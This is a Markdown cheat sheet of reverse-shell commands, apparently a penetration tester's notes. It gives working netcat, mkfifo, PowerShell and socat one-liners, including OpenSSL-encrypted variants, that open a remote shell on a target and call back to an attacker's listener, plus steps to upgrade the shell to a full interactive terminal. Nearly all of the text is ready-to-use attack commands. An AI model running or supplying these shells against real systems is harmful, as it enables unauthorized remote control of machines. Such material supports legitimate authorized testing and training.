##### More payloads for reverse shell at
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```
## NetCat
#### Attacker
```
nc -lvnp <port>
```

#### Target 

Linux
``` 
nc <ip> <port> -e /bin/bash
```

Windows
```
nc <ip> <port> -e cmd.exe
```
### Interactive Shell

Linux
```1
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```2
export TERM=xterm
```
```3
ctrl+Z
```
```4
stty raw -echo;fg
```

Windows
```
rlwrap nc -lvnp <port>
```
```
ctrl+z
```
```
stty raw;fg
```

### If -e is blocked

#### Attacker
```
nc -lvnp <port>
```
#### Target
Linux
```
mkfifo /tmp/f; nc <ip> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Windows(PowerShell)
#### Attacker
```
nc -lvnp <port>
```
#### Target
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
## Socat

#### Attacker
```
socat tcp-l:<port> -
```

#### Target

Linux
```
socat tcp:<ip>:<port> EXEC:"bash -li"
```
Windows
```
socat tcp:<ip>:<port> EXEC:powershell.exe (or cmd.exe),pipes
```


### Interactive Shell(for Linux Target)

#### Attacker
```
socat tcp-l:<port> file:`tty`,raw,echo=0
```
#### Target

Linux
```
socat tcp:<ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


### Encrypted Shell
create certificate
```
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
```
```
cat shell.key shell.crt >shell.pem
```
#### Attacker
```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
#### Target
Windows
```
socat OPENSSL:<IP>:<PORT>,verify=0 EXEC:powershell.exe
```


### Encrypted Interactive Reverse Shell(for Linux Target)
#### Attacker
```
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

#### Target
```
socat OPENSSL:<ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```